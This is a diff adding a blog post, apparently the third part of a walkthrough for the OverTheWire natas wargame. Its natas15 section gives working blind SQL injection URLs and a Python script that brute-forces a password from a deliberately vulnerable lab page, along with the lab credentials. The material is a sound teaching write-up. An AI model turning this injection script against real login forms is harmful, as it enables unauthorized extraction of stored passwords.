@@ -1,0 +1,1234 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Natas Challenges (part 3) - noopz</title><meta name="Description" content="The third in a multi-part walkthrough for the OverTheWire natas levels."><meta property="og:title" content="Natas Challenges (part 3)" />
+<meta property="og:description" content="The third in a multi-part walkthrough for the OverTheWire natas levels." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/natas_challenges_part3/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-06-13T18:26:53+00:00" />
+<meta property="article:modified_time" content="2020-06-14T12:10:36-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Natas Challenges (part 3)"/>
+<meta name="twitter:description" content="The third in a multi-part walkthrough for the OverTheWire natas levels."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/natas_challenges_part3/" /><link rel="prev" href="https://noopz.github.io/plex_aac_atfv_fix/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Natas Challenges (part 3)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/natas_challenges_part3\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, natas, wargames","wordcount":  3074 ,
+        "url": "https:\/\/noopz.github.io\/natas_challenges_part3\/","datePublished": "2020-06-13T18:26:53+00:00","dateModified": "2020-06-14T12:10:36-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The third in a multi-part walkthrough for the OverTheWire natas levels."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Natas Challenges (part 3)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-13">2020-06-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3074 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;15 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#natas15">natas15</a></li>
+    <li><a href="#natas16">natas16</a></li>
+    <li><a href="#natas17">natas17</a></li>
+    <li><a href="#natas18">natas18</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Continuing to work through the OverTheWire natas challenges, this post covers solutions for levels 15 through 18. These have all been grouped together as they all build off of the same basic python solution.</p>
+<ul>
+<li>Part 1 can be found <a href="https://noopz.github.io/natas_challenges_part1/" rel="">here</a></li>
+<li>Part 2 can be found <a href="https://noopz.github.io/natas_challenges_part2/" rel="">here</a></li>
+</ul>
+<h2 id="natas15">natas15</h2>
+<p>Starting this off by going to: <a href="http://natas15.natas.labs.overthewire.org/">http://natas15.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas15
+Pass: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+</code></pre></td></tr></table>
+</div>
+</div><p>Another login challenge, looking at the source again to get an idea of what needs to be done:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas15<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?
+</span><span class="cp">/*
+</span><span class="cp">CREATE TABLE `users` (
+</span><span class="cp">  `username` varchar(64) DEFAULT NULL,
+</span><span class="cp">  `password` varchar(64) DEFAULT NULL
+</span><span class="cp">);
+</span><span class="cp">*/
+</span><span class="cp">
+</span><span class="cp">if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
+</span><span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&lt;censored&gt;&#39;);
+</span><span class="cp">    mysql_select_db(&#39;natas15&#39;, $link);
+</span><span class="cp">
+</span><span class="cp">    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
+</span><span class="cp">    if(array_key_exists(&#34;debug&#34;, $_GET)) {
+</span><span class="cp">        echo &#34;Executing query: $query&lt;br&gt;&#34;;
+</span><span class="cp">    }
+</span><span class="cp">
+</span><span class="cp">    $res = mysql_query($query, $link);
+</span><span class="cp">    if($res) {
+</span><span class="cp">    if(mysql_num_rows($res) &gt; 0) {
+</span><span class="cp">        echo &#34;This user exists.&lt;br&gt;&#34;;
+</span><span class="cp">    } else {
+</span><span class="cp">        echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+</span><span class="cp">    }
+</span><span class="cp">    } else {
+</span><span class="cp">        echo &#34;Error in query.&lt;br&gt;&#34;;
+</span><span class="cp">    }
+</span><span class="cp">
+</span><span class="cp">    mysql_close($link);
+</span><span class="cp">} else {
+</span><span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Check existence&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>More SQL queries need to be exploited in some fashion to move onto the next level. As the query stands, it just checks for the existence of the provided &ldquo;username&rdquo; in the users table, if it finds a match a result is returned and a message is printed stating that the user exists. The query for this looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;&lt;value&gt;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The important thing to note here is that the input <code>&lt;value&gt;</code> is not sanitize for any sort of illegal characters, allowing for <a href="https://en.wikipedia.org/wiki/SQL_injection" target="_blank" rel="noopener noreffer">SQL injection</a>. Another thing to note since we don&rsquo;t explicitly log in here, and only know if the user exists or not, this has to be solved via a <a href="https://en.wikipedia.org/wiki/SQL_injection#Blind_SQL_injection" target="_blank" rel="noopener noreffer">Blind SQL Injection</a>. The general concept is that indirect information is leaked that can used to determine what an actual answer is, without the page ever fully disclosing the answer we are looking for. For this attack we can brute force the password by using truthy values to slowly iterate over every character of what the users password would be. For this particular case, <code>username=&quot;natas16&quot;</code> and <code>substring(password,1,1) == &quot;&lt;character&gt;&quot;</code>, where the second argument of substring increases as we find matches. The query for this looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;natas16&#34;</span> <span class="k">AND</span> <span class="k">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s2">&#34;&lt;character&gt;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The input string to generate an SQL statement that checks for the letter <code>a</code> in the password looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">natas16</span><span class="s2">&#34; and substring(password,1,1) = &#34;</span><span class="n">a</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Combining that with the url from <code>natas15</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20substring(password,1,1)%20=%20&#34;w<span class="err">&amp;</span>debug
+</code></pre></td></tr></table>
+</div>
+</div><p>Which returns the result of <code>This user exists</code>. Since we don&rsquo;t know how the database is configured, this approach may not factor in case sensitivity. This can be demonstrated with checking for <code>W</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20substring(password,1,1)%20=%20&#34;W<span class="err">&amp;</span>debug
+</code></pre></td></tr></table>
+</div>
+</div><p>The above also returns a <code>This user exists</code>, but it&rsquo;s unclear as to if the password contains both <code>W</code> and <code>w</code> or it&rsquo;s just acting in a case insensitive mode. There are two possible ways to overcome this. First, there&rsquo;s a SQL built-in to get the ASCII value, which can then be used instead of checking against a character:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20ascii(substring(password,1,1))%20=%20&#34;64<span class="err">&amp;</span>debug
+</code></pre></td></tr></table>
+</div>
+</div><p>It&rsquo;s then possible to write a python script to iterate through all possible combinations and build up a final result while slowly iterating through all of possible characters - this could be a lot of attempts at guessing, so it&rsquo;s a bit slow when brute forcing.</p>
+<p>The second method provides a fairly significant speed up this guesswork by using the <a href="https://www.w3schools.com/sql/sql_like.asp" target="_blank" rel="noopener noreffer">LIKE</a> operator in SQL, since it allows for wildcards:</p>
+<table>
+<thead>
+<tr>
+<th>LIKE Operator</th>
+<th></th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WHERE tablename LIKE &lsquo;a%&rsquo;</td>
+<td></td>
+<td>Finds any values that start with &ldquo;a&rdquo;</td>
+</tr>
+<tr>
+<td>WHERE tablename LIKE &lsquo;%a&rsquo;</td>
+<td></td>
+<td>Finds any values that end with &ldquo;a&rdquo;</td>
+</tr>
+<tr>
+<td>WHERE tablename LIKE &lsquo;%or%&rsquo;</td>
+<td></td>
+<td>Finds any values that have &ldquo;or&rdquo; in any position</td>
+</tr>
+<tr>
+<td>WHERE tablename LIKE &lsquo;_r%&rsquo;</td>
+<td></td>
+<td>Finds any values that have &ldquo;r&rdquo; in the second position</td>
+</tr>
+<tr>
+<td>WHERE tablename LIKE &lsquo;a__%&rsquo;</td>
+<td></td>
+<td>Finds any values that start with &ldquo;a&rdquo; and are at least 3 characters in length</td>
+</tr>
+<tr>
+<td>WHERE tablename LIKE &lsquo;a%o&rsquo;</td>
+<td></td>
+<td>Finds any values that start with &ldquo;a&rdquo; and ends with &ldquo;o&rdquo;</td>
+</tr>
+</tbody>
+</table>
+<p>It&rsquo;s important to note that the <code>LIKE</code> operator honors the table&rsquo;s settings for case sensitivity unless it&rsquo;s combined with <code>BINARY</code>.</p>
+<p>Using the <code>LIKE</code> operator with <code>%&lt;character&gt;%</code> allows us to figure out if a given character exists anywhere in the password. We can also leverage the <code>&lt;character&gt;%</code> to determine the order of the character by slowly building up the password as we go along and trying out a new character on the end.</p>
+<p>Query for finding characters with wildcards:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;natas16&#34;</span> <span class="k">AND</span> <span class="n">password</span> <span class="k">LIKE</span> <span class="nb">BINARY</span> <span class="s2">&#34;%&lt;character&gt;%&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Query for finding positions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;natas16&#34;</span> <span class="k">AND</span> <span class="n">password</span> <span class="k">LIKE</span> <span class="nb">BINARY</span> <span class="s2">&#34;&lt;knowncharacters&gt; + &lt;character&gt;%&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>With the theory out of the way, it&rsquo;s time for some python to beat this level:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="c1"># This few lines are used to be able to login and start sending the queries</span>
+<span class="c1"># with the natas15 username and password</span>
+<span class="n">SITE</span> <span class="o">=</span> <span class="s2">&#34;http://natas15.natas.labs.overthewire.org/index.php?debug&amp;&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas15&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#34;</span>
+<span class="n">PASS_MGR</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPPasswordMgrWithDefaultRealm</span><span class="p">()</span>
+<span class="n">PASS_MGR</span><span class="o">.</span><span class="n">add_password</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">SITE</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+
+<span class="n">AUTH_HANDLER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPBasicAuthHandler</span><span class="p">(</span><span class="n">PASS_MGR</span><span class="p">)</span>
+<span class="n">OPENER</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">AUTH_HANDLER</span><span class="p">)</span>
+<span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">OPENER</span><span class="p">)</span>
+
+<span class="n">CHARSET</span> <span class="o">=</span> <span class="s1">&#39;wWabcdefghijklmnopqrstuvxyz1234567890QERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_filtered_chars</span><span class="p">():</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">))</span>
+
+        <span class="c1"># SELECT * from users WHERE username=&#34;natas16&#34; AND password LIKE BINARY &#34;%&lt;character&gt;%&#34;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;username=natas16&#34;%20AND%20password%20LIKE%20BINARY%20&#34;%&#39;</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+        <span class="n">html_result</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">html_result</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;This user exists&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">filtered_chars</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current chars: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">filtered_chars</span>
+
+<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">):</span>
+    <span class="n">bruteforced</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">while</span> <span class="n">still_forcing</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">filtered_chars</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying </span><span class="si">%s</span><span class="s2"> at index: </span><span class="si">%d</span><span class="se">\r</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">index</span><span class="p">))</span>
+            <span class="c1"># SELECT * from users WHERE username=&#34;natas16&#34; AND password LIKE BINARY &#34;&lt;knowncharacters&gt; + &lt;character&gt;%&#34;</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;username=natas16&#34;%20AND%20password%20LIKE%20BINARY%20&#34;&#39;</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="n">SITE</span> <span class="o">+</span> <span class="n">payload</span>
+            <span class="n">html_result</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">html_result</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;This user exists&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">bruteforced</span> <span class="o">=</span> <span class="n">bruteforced</span> <span class="o">+</span> <span class="n">char</span>
+                <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Current password: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">bruteforced</span><span class="p">)</span>
+                <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">True</span>
+                <span class="k">break</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">still_forcing</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="n">bruteforced</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># First use the LIKE + binary to determine what characters are actually used</span>
+    <span class="n">filtered_chars</span> <span class="o">=</span> <span class="n">get_filtered_chars</span><span class="p">()</span>
+    <span class="c1"># Used the filtered list to &#34;quickly&#34; get the password</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">brute_force_password</span><span class="p">(</span><span class="n">filtered_chars</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;**** PASSWORD DISCOVERED ***&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And after running that for a bit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">**** PASSWORD DISCOVERED ***
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="natas16">natas16</h2>
